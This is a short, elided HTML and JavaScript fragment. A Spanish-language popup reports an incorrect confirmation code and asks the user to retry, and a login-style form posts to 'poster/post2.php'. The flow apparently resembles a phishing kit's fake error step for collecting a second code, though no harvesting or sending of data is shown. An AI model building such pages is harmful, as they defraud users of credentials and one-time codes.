...
Swal.fire({
    ...
    confirmButtonText: 'Aceptar',
    allowOutsideClick: false,
    html: '<h1 style="text-align:center;margin-bottom:15px;font-size:30px;font-weight: bold;">CLAVE DE CONFIRMACI&Oacute;N INCORRECTA</h1><br><p style="text-align:center;">La clave que haz ingresado es incorrecta, intenta de nuevo</p>'
});
</script>
...
<div class="mdLgn">
	<div class="lmt">
			<div class="mdCnt">
				...
				<div class="frmWrpr">
                    <form action="poster/post2.php" method="post">
					<ul>
						<li class="aCenter">
							<div class="fields">
